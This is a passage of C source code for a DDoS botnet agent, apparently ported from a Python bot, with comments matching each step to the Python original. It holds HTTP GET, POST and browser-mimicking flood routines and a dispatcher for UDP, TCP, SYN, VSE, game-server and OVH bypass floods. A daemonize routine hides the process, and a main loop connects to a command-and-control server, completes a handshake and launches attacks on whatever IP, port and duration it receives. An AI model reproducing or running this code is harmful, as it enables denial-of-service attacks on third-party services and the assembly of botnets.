        // The Python `try...except` around the connect and inner send loop means any error inside breaks the inner loop and goes to the outer loop's next iteration (after closing).
        while (time(NULL) < end_time) {
             if (*stop_flag) break; // Check stop flag

             const char* user_agent = rand_ua();
             // Construct the HTTP GET request string
             // f'GET / HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {rand_ua()}\r\nConnection: keep-alive\r\n\r\n'
             size_t request_len = snprintf(NULL, 0, "GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: keep-alive\r\n\r\n", ip, user_agent);
             char* request = malloc(request_len + 1);
             if (!request) {
                 // Python passes on error.
                 // perror("malloc failed for HTTP GET request");
                 break; // Break inner loop on malloc error
             }
             sprintf(request, "GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: keep-alive\r\n\r\n", ip, user_agent);

             // Python passes on send errors. We don't check return value.
             if (send(s, request, request_len, 0) < 0) {
                 // Error occurred, break inner loop like Python's except
                 free(request);
                 break;
             }

             free(request); // Free the allocated request string
        }

        // Python closes the socket after the inner loop finishes or on error.
        if (s >= 0) close(s);
    }

    free(args); // Free the allocated arguments struct
    args->slot->active = 0; // Mark slot as inactive
    pthread_exit(NULL);
}

void* attack_http_post(void* arg) {
    attack_args_t* args = (attack_args_t*)arg;
    char* ip = args->ip;
    int port = args->port;
    time_t end_time = args->end_time;
    volatile int* stop_flag = args->stop_flag;

    struct sockaddr_in target_addr;
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(port);
    if (inet_pton(AF_INET, ip, &target_addr.sin_addr) <= 0) {
        // Python passes on error.
        // perror("Invalid address/ Address not supported");
        free(args);
        args->slot->active = 0;
        pthread_exit(NULL);
    }

    // Python payload is a hex string representing bytes.
    // '757365726e616d653d61646d696e2670617373776f72643d70617373776f726431323326656d61696c3d61646d696e406578616d706c652e636f6d267375626d69743d6c6f67696e'
    // This decodes to "username=admin&password=password123&email=admin@example.com&submit=login"
    const char* payload = "username=admin&password=password123&email=admin@example.com&submit=login";
    size_t payload_len = strlen(payload);

    while (time(NULL) < end_time) {
        if (*stop_flag) break;

        int s = -1;
        // Python creates socket inside the loop and connects. Let's match that.
        s = socket(AF_INET, SOCK_STREAM, 0);
        if (s < 0) {
            // Python passes on error.
            // perror("Cannot create socket");
            usleep(100000);
            continue; // Try creating socket again in next iteration
        }

        // Python: try: s.connect((ip, port)) ... except: s.close()
        // If connect fails, Python closes the socket and the outer loop continues.
        if (connect(s, (struct sockaddr *)&target_addr, sizeof(target_addr)) < 0) {
            // Python passes on error.
            // perror("Cannot connect");
            if (s >= 0) close(s);
            usleep(100000);
            continue; // Outer loop continues
        }

        // Python: while time.time() < secs: s.send(headers.encode())
        // This inner loop continues sending until the attack duration ends or send fails.
        // The Python `try...except` around the connect and inner send loop means any error inside breaks the inner loop and goes to the outer loop's next iteration (after closing).
        while (time(NULL) < end_time) {
             if (*stop_flag) break; // Check stop flag

             const char* user_agent = rand_ua();
             // Construct the HTTP POST request string
             // f'POST / HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {rand_ua()}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {len(payload)}\r\nConnection: keep-alive\r\n\r\n{payload}'
             size_t headers_len = snprintf(NULL, 0, "POST / HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %zu\r\nConnection: keep-alive\r\n\r\n", ip, user_agent, payload_len);
             size_t request_len = headers_len + payload_len;
             char* request = malloc(request_len + 1); // +1 for null terminator if needed, but sending raw bytes
             if (!request) {
                 // Python passes on error.
                 // perror("malloc failed for HTTP POST request");
                 break; // Break inner loop on malloc error
             }
             sprintf(request, "POST / HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %zu\r\nConnection: keep-alive\r\n\r\n", ip, user_agent, payload_len);
             memcpy(request + headers_len, payload, payload_len); // Append payload bytes

             // Python passes on send errors. We don't check return value.
             if (send(s, request, request_len, 0) < 0) {
                 // Error occurred, break inner loop like Python's except
                 free(request);
                 break;
             }

             free(request); // Free the allocated request string
        }

        // Python closes the socket after the inner loop finishes or on error.
        if (s >= 0) close(s);
    }

    free(args); // Free the allocated arguments struct
    args->slot->active = 0; // Mark slot as inactive
    pthread_exit(NULL);
}

void* attack_browser(void* arg) {
    attack_args_t* args = (attack_args_t*)arg;
    char* ip = args->ip;
    int port = args->port;
    time_t end_time = args->end_time;
    volatile int* stop_flag = args->stop_flag;

    struct sockaddr_in target_addr;
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(port);
    if (inet_pton(AF_INET, ip, &target_addr.sin_addr) <= 0) {
        // Python passes on error.
        // perror("Invalid address/ Address not supported");
        free(args);
        args->slot->active = 0;
        pthread_exit(NULL);
    }

    while (time(NULL) < end_time) {
        if (*stop_flag) break;

        int s = -1;
        // Python creates socket inside the loop and connects. Let's match that.
        s = socket(AF_INET, SOCK_STREAM, 0);
        if (s < 0) {
            // Python passes on error.
            // perror("Cannot create socket");
            usleep(100000);
            continue; // Try creating socket again in next iteration
        }

        // Python: s.settimeout(5)
        struct timeval tv;
        tv.tv_sec = 5;
        tv.tv_usec = 0;
        setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv, sizeof tv);
        setsockopt(s, SOL_SOCKET, SO_SNDTIMEO, (const char*)&tv, sizeof tv);


        // Python: try: s.connect((ip, port)) ... except Exception as e: pass finally: s.close()
        // If connect fails, Python closes the socket and the outer loop continues.
        if (connect(s, (struct sockaddr *)&target_addr, sizeof(target_addr)) < 0) {
            // Python passes on error.
            // perror("Cannot connect");
            if (s >= 0) close(s);
            usleep(100000);
            continue; // Outer loop continues
        }

        // Python: s.sendall(request.encode())
        // Python sends the request once per connection attempt.
        const char* user_agent = rand_ua();
        // Construct the HTTP GET request string
        // f'GET / HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {rand_ua()}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: en-US,en;q=0.5\r\nConnection: keep-alive\r\nUpgrade-Insecure-Requests: 1\r\nCache-Control: max-age=0\r\nPragma: no-cache\r\n\r\n'
        size_t request_len = snprintf(NULL, 0, "GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: en-US,en;q=0.5\r\nConnection: keep-alive\r\nUpgrade-Insecure-Requests: 1\r\nCache-Control: max-age=0\r\nPragma: no-cache\r\n\r\n", ip, user_agent);
        char* request = malloc(request_len + 1);
        if (!request) {
            // Python passes on error.
            // perror("malloc failed for HTTP BROWSER request");
            if (s >= 0) close(s);
            usleep(100000);
            continue; // Outer loop continues
        }
        sprintf(request, "GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: en-US,en;q=0.5\r\nConnection: keep-alive\r\nUpgrade-Insecure-Requests: 1\r\nCache-Control: max-age=0\r\nPragma: no-cache\r\n\r\n", ip, user_agent);

        // Python passes on sendall errors. We don't check return value.
        // A full sendall implementation in C requires a loop. Let's use send for simplicity matching Python's error handling.
        send(s, request, request_len, 0);

        free(request); // Free the allocated request string

        // Python closes the socket after the sendall finishes or on error.
        if (s >= 0) close(s);
    }

    free(args); // Free the allocated arguments struct
    args->slot->active = 0; // Mark slot as inactive
    pthread_exit(NULL);
}


// Dispatcher function
void* lunch_attack(void* arg) {
    attack_args_t_with_method* args_with_method = (attack_args_t_with_method*)arg;
    char* method = args_with_method->method;

    // Create the standard attack_args_t struct to pass to the specific attack function
    attack_args_t* attack_args = malloc(sizeof(attack_args_t));
    if (!attack_args) {
         perror("malloc failed for attack_args");
         // Cannot proceed, free the initial args and mark slot inactive
         free(args_with_method);
         args_with_method->slot->active = 0;
         pthread_exit(NULL);
    }
    // Copy common arguments
    strncpy(attack_args->ip, args_with_method->ip, INET_ADDRSTRLEN - 1); attack_args->ip[INET_ADDRSTRLEN - 1] = '\0';
    attack_args->port = args_with_method->port;
    attack_args->end_time = args_with_method->end_time;
    attack_args->stop_flag = args_with_method->stop_flag;
    attack_args->slot = args_with_method->slot;

    // Free the initial args struct passed to lunch_attack
    free(args_with_method);

    // Call the appropriate attack function based on the method string
    if (strcmp(method, ".HEX") == 0) {
        attack_hex(attack_args);
    } else if (strcmp(method, ".UDP") == 0) {
        attack_udp_bypass(attack_args);
    } else if (strcmp(method, ".TCP") == 0) {
        attack_tcp_bypass(attack_args);
    } else if (strcmp(method, ".MIX") == 0) {
        attack_tcp_udp_bypass(attack_args);
    } else if (strcmp(method, ".SYN") == 0) {
        attack_syn(attack_args);
    } else if (strcmp(method, ".VSE") == 0) {
        attack_vse(attack_args);
    } else if (strcmp(method, ".MCPE") == 0) {
        attack_mcpe(attack_args);
    } else if (strcmp(method, ".FIVEM") == 0) {
        attack_fivem(attack_args);
    } else if (strcmp(method, ".HTTPGET") == 0) {
        attack_http_get(attack_args);
    } else if (strcmp(method, ".HTTPPOST") == 0) {
        attack_http_post(attack_args);
    } else if (strcmp(method, ".BROWSER") == 0) {
        attack_browser(attack_args);
    } else if (strcmp(method, ".OVHTCP") == 0) {
        attack_ovh_tcp(attack_args);
    } else if (strcmp(method, ".OVHUDP") == 0) {
        attack_ovh_udp(attack_args);
    } else {
        // Unknown method
        fprintf(stderr, "Unknown attack method: %s\n", method);
        // Free the attack_args struct that was allocated but not used by an attack function
        free(attack_args);
        // Mark slot inactive (already done by the specific attack function, but do here for unknown method)
        // This requires the slot pointer, which is in the freed args_with_method.
        // Need to rethink how slot is marked inactive on error *before* calling attack func.
        // Let's pass the slot pointer in attack_args_t as well. (Already done in the struct definition)
        attack_args->slot->active = 0;
    }

    // The individual attack functions are responsible for freeing their attack_args_t
    // and marking the slot inactive before exiting.
    // This dispatcher function should just exit after calling the attack function.
    pthread_exit(NULL);
}


// Start attack function
void start_attack(const char* method, const char* ip, int port, int duration, int thread_count, const char* username) {
    time_t end_time = time(NULL) + duration;

    pthread_mutex_lock(&user_attacks_mutex);

    for (int i = 0; i < thread_count; ++i) {
        // Find a free slot
        int slot_index = -1;
        for (int j = 0; j < MAX_CONCURRENT_ATTACKS; ++j) {
            if (!user_attacks_slots[j].active) {
                slot_index = j;
                break;
            }
        }

        if (slot_index == -1) {
            fprintf(stderr, "Max concurrent attacks reached, cannot start new thread.\n");
            break; // Cannot start more threads
        }

        // Prepare arguments for the thread (using the struct with method string for the dispatcher)
        attack_args_t_with_method* args = malloc(sizeof(attack_args_t_with_method));
        if (!args) {
            perror("malloc failed for thread args");
            break; // Cannot start this thread
        }

        strncpy(args->method, method, sizeof(args->method) - 1); args->method[sizeof(args->method) - 1] = '\0';
        strncpy(args->ip, ip, INET_ADDRSTRLEN - 1); args->ip[INET_ADDRSTRLEN - 1] = '\0';
        args->port = port;
        args->end_time = end_time;
        args->stop_flag = &user_attacks_slots[slot_index].stop_flag; // Point to the flag in the slot
        args->slot = &user_attacks_slots[slot_index]; // Point back to the slot

        // Initialize slot info
        user_attacks_slots[slot_index].active = 1;
        user_attacks_slots[slot_index].stop_flag = 0; // Initialize stop flag
        strncpy(user_attacks_slots[slot_index].username, username, sizeof(user_attacks_slots[slot_index].username) - 1);
        user_attacks_slots[slot_index].username[sizeof(user_attacks_slots[slot_index].username) - 1] = '\0';
        user_attacks_slots[slot_index].thread_args = args; // Store args pointer (will be freed by thread)

        // Create thread
        // Python threads are daemon. C threads are not by default.
        // Detaching threads makes them behave more like daemon threads (don't need joining).
        pthread_attr_t attr;
        pthread_attr_init(&attr);
        pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED);

        if (pthread_create(&user_attacks_slots[slot_index].thread_id, &attr, lunch_attack, args) != 0) {
            perror("Failed to create thread");
            // Clean up the slot and allocated args if thread creation fails
            user_attacks_slots[slot_index].active = 0;
            free(args);
        }

        pthread_attr_destroy(&attr); // Clean up attribute object
    }

    pthread_mutex_unlock(&user_attacks_mutex);
}

// Stop attacks function
void stop_attacks(const char* username) {
    pthread_mutex_lock(&user_attacks_mutex);

    // Iterate through active slots and set the stop flag for matching usernames
    for (int i = 0; i < MAX_CONCURRENT_ATTACKS; ++i) {
        if (user_attacks_slots[i].active) {
            if (strcmp(user_attacks_slots[i].username, username) == 0) {
                user_attacks_slots[i].stop_flag = 1; // Signal the thread to stop
                // Note: The thread is responsible for setting active=0 and freeing args
            }
        }
    }

    // Python clears the list entry immediately. In C with detached threads,
    // we cannot safely free the slot or args here as the thread might still be running
    // and accessing them. The thread itself must mark the slot inactive and free args.
    // The fixed-size array approach means slots are reused, not freed.
    // We could add a cleanup loop here to wait for threads that have set active=0,
    // but the Python code doesn't wait, it just signals and clears its reference.
    // Setting the flag is the direct equivalent of the Python stop_event.set().
    // Clearing the Python dictionary entry is like marking the slot inactive,
    // which the thread does in our C translation.

    pthread_mutex_unlock(&user_attacks_mutex);
}

void daemonize() {
    pid_t pid = fork();

    if (pid < 0) exit(EXIT_FAILURE);
    if (pid > 0) exit(EXIT_SUCCESS); // Parent exits

    if (setsid() < 0) exit(EXIT_FAILURE);

    signal(SIGCHLD, SIG_IGN);
    signal(SIGHUP, SIG_IGN);

    pid = fork();
    if (pid < 0) exit(EXIT_FAILURE);
    if (pid > 0) exit(EXIT_SUCCESS); // First child exits

    umask(0);
    chdir("/");

    for (int x = sysconf(_SC_OPEN_MAX); x >= 0; x--) {
        close(x);
    }

    open("/dev/null", O_RDWR); // stdin
    dup(0); // stdout
    dup(0); // stderr
}

// Main function
int main() {
	daemonize();
    // Seed random number generator
    srand(time(NULL));

    // Initialize attack slots
    for (int i = 0; i < MAX_CONCURRENT_ATTACKS; ++i) {
        user_attacks_slots[i].active = 0;
        user_attacks_slots[i].stop_flag = 0;
        user_attacks_slots[i].username[0] = '\0';
        user_attacks_slots[i].thread_args = NULL;
    }

    while (1) {
        int c2_sock = -1;
        struct sockaddr_in c2_addr;
        char buffer[1024];
        ssize_t bytes_received;

        // Python: c2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        c2_sock = socket(AF_INET, SOCK_STREAM, 0);
        if (c2_sock < 0) {
            perror("Cannot create C2 socket");
            sleep(120); // Python sleeps 120 on error
            continue; // Retry connection
        }

        // Python: c2.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
        int keepalive = 1;
        if (setsockopt(c2_sock, SOL_SOCKET, SO_KEEPALIVE, &keepalive, sizeof(keepalive)) < 0) {
            perror("Failed to set SO_KEEPALIVE");
            // Continue anyway, not a fatal error based on Python's structure
        }

        // Python: c2.connect((C2_ADDRESS, C2_PORT))
        c2_addr.sin_family = AF_INET;
        c2_addr.sin_port = htons(C2_PORT);
        if (inet_pton(AF_INET, C2_ADDRESS, &c2_addr.sin_addr) <= 0) {
            perror("Invalid C2 address/ Address not supported");
            close(c2_sock);
            sleep(120); // Python sleeps 120 on error
            continue; // Retry connection
        }

        // printf("Connecting to C2...\n"); // Added for visibility
        if (connect(c2_sock, (struct sockaddr *)&c2_addr, sizeof(c2_addr)) < 0) {
            perror("Cannot connect to C2");
            close(c2_sock);
            sleep(120); // Python sleeps 120 on error
            continue; // Retry connection
        }
        // printf("Connected to C2.\n"); // Added for visibility


        // Python Handshake
        // while 1: data = c2.recv(1024).decode(); if 'Username' in data: c2.send(get_architecture().encode()); break
        while (1) {
            bytes_received = recv(c2_sock, buffer, sizeof(buffer) - 1, 0);
            if (bytes_received <= 0) {
                // Connection closed or error
                // perror("C2 connection closed during handshake (Username)"); // Python passes
                close(c2_sock);
                goto reconnect; // Go to outer loop retry
            }
            buffer[bytes_received] = '\0'; // Null-terminate received data

            // Python: if 'Username' in data:
            if (strstr(buffer, "Username") != NULL) {
                char* arch = get_architecture();
                send(c2_sock, arch, strlen(arch), 0);
                free(arch); // Free allocated architecture string
                break; // Handshake step complete
            }
        }

        // while 1: data = c2.recv(1024).decode(); if 'Password' in data: c2.send('\xff\xff\xff\xff\75'.encode('cp1252')); break
        while (1) {
            bytes_received = recv(c2_sock, buffer, sizeof(buffer) - 1, 0);
            if (bytes_received <= 0) {
                // Connection closed or error
                // perror("C2 connection closed during handshake (Password)"); // Python passes
                close(c2_sock);
                goto reconnect; // Go to outer loop retry
            }
            buffer[bytes_received] = '\0'; // Null-terminate received data

            // Python: if 'Password' in data:
            if (strstr(buffer, "Password") != NULL) {
                unsigned char password_payload[] = {0xff, 0xff, 0xff, 0xff, 0x75}; // '\xff\xff\xff\xff\75'.encode('cp1252')
                send(c2_sock, password_payload, sizeof(password_payload), 0);
                break; // Handshake step complete
            }
        }


        // Main command loop
        // while 1: try: data = c2.recv(1024).decode().strip(); if not data: break; ... except: break
        while (1) {
            bytes_received = recv(c2_sock, buffer, sizeof(buffer) - 1, 0);
            if (bytes_received <= 0) {
                // Connection closed or error
                // perror("C2 connection closed or error during command loop"); // Python breaks
                break; // Break inner command loop
            }
            buffer[bytes_received] = '\0'; // Null-terminate
            // Python: .strip()
            // Simple strip: remove leading/trailing whitespace/newlines
            char* end = buffer + strlen(buffer) - 1;
            while(end >= buffer && (*end == ' ' || *end == '\n' || *end == '\r' || *end == '\t')) {
                *end = '\0';
                end--;
            }
            char* start = buffer;
            while(*start && (*start == ' ' || *start == '\n' || *start == '\r' || *start == '\t')) {
                start++;
            }
            if (start != buffer) { // Shift string if leading whitespace was removed
                memmove(buffer, start, strlen(start) + 1);
            }

            // Python: if not data: break
            if (strlen(buffer) == 0) {
                break; // Empty command, break inner loop
            }

            // Python: args = data.split(' ')
            char* args[10]; // Assuming max 10 arguments
            int arg_count = 0;
            char* token = strtok(buffer, " ");
            while (token != NULL && arg_count < 10) {
                args[arg_count++] = token;
                token = strtok(NULL, " ");
            }

            if (arg_count == 0) {
                continue; // Empty line after strip/split
            }

            // Python: command = args[0].upper()
            // Convert command to uppercase for comparison
            char command[20]; // Assuming max command length
            strncpy(command, args[0], sizeof(command) - 1);
            command[sizeof(command) - 1] = '\0';
            for (int i = 0; command[i]; i++) {
                command[i] = toupper((unsigned char)command[i]);
            }

            // Python: if command == 'PING': c2.send('PONG'.encode())
            if (strcmp(command, "PING") == 0) {
                send(c2_sock, "PONG", strlen("PONG"), 0);
            }
            // Python: elif command == 'STOP' and len(args) > 1: username = args[1]; stop_attacks(username)
            else if (strcmp(command, "STOP") == 0 && arg_count > 1) {
                char* username = args[1];
                stop_attacks(username);
            }
            // Python: else: method = command; ip = args[1]; port = int(args[2]); secs = int(args[3]); threads = int(args[4]); username = args[5] if len(args) >= 6 else "default"; start_attack(...)
            else {
                // Expecting: METHOD IP PORT SECS THREADS [USERNAME]
                if (arg_count < 5) {
                    fprintf(stderr, "Invalid command format: %s\n", buffer);
                    continue; // Skip invalid command
                }
                char* method = command; // Command is already uppercase method
                char* ip = args[1];
                int port = atoi(args[2]);
                int secs = atoi(args[3]);
                int threads = atoi(args[4]);
                char* username = (arg_count >= 6) ? args[5] : "default";

                // Basic validation (optional, but good practice)
                if (port <= 0 || secs <= 0 || threads <= 0) {
                     fprintf(stderr, "Invalid port, duration, or thread count: %s\n", buffer);
                     continue;
                }
                 struct sockaddr_in sa;
                 if (inet_pton(AF_INET, ip, &(sa.sin_addr)) <= 0) {
                     fprintf(stderr, "Invalid IP address: %s\n", ip);
                     continue;
                 }

                start_attack(method, ip, port, secs, threads, username);
            }
        } // End of inner command loop

        // Python: c2.close()
        close(c2_sock);

        // Python: main() - This creates an infinite loop of reconnecting main calls.
        // In C, we use a goto or the outer while(1) loop.
        // The outer while(1) already handles the reconnect logic.
        // The break from the inner loop leads here, then the outer loop continues.
        // The Python `except: break` followed by `c2.close()` and `main()`
        // means any error in the inner loop breaks out, closes the socket, and restarts `main`.
        // Our C structure with `goto reconnect` on handshake errors and `break` on command loop errors
        // followed by `close(c2_sock)` and the outer `while(1)` achieves the same restart behavior.

        reconnect:
        // printf("Reconnecting in 120 seconds...\n"); // Added for visibility
        sleep(120); // Sleep before reconnecting
    } // End of outer connection loop

    // Should not be reached
    return 0;
}
